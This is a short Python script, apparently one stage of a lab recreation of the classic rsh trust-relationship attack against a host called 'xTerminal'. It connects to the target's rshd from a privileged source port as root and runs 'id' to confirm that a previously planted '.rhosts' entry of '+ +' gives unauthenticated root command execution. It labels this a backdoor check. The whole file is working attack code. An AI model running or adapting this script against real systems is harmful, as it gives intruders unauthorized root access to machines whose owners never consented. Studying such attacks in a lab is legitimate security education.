import socket

XTERMINAL_IP = "10.0.2.20"
TARGET_PORT = 514
LUSER = "root"
RUSER = "root"


def rsh_direct(cmd: str) -> str:
    """
    Conexão RSH real (sem spoofing) a partir do atacante.
    Possível porque .rhosts contém '+ +' após a etapa 4.
    Retorna o output do comando executado no xTerminal.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    # rshd exige porta de origem privilegiada (512–1023)
    for _p in range(1023, 511, -1):
        try:
            sock.bind(("", _p))
            break
        except OSError:
            continue
    sock.connect((XTERMINAL_IP, TARGET_PORT))

    payload = f"0\x00{LUSER}\x00{RUSER}\x00{cmd}\x00".encode()
    sock.sendall(payload)

    # rshd envia \x00 se aceitar, ou mensagem de erro terminada em \x00
    ack = sock.recv(1)
    if ack != b"\x00":
        error = ack + sock.recv(1024)
        raise RuntimeError(f"rshd recusou conexão: {error.decode(errors='replace')}")

    # Lê output do comando
    chunks = []
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
    except socket.timeout:
        pass

    sock.close()
    return b"".join(chunks).decode(errors="replace")


def verify_backdoor() -> bool:
    """
    Confirma acesso ao xTerminal executando 'id' e exibindo o resultado.
    Retorna True se o acesso foi bem-sucedido.
    """
    print("[*] Testando acesso direto via RSH (sem spoofing)...")
    try:
        output = rsh_direct("id")
        print(f"[+] Acesso confirmado! Saída de 'id':\n    {output.strip()}")
        return True
    except (ConnectionRefusedError, OSError) as e:
        print(f"[-] Falha na conexão: {e}")
        return False
    except RuntimeError as e:
        print(f"[-] {e}")
        return False


if __name__ == "__main__":
    verify_backdoor()
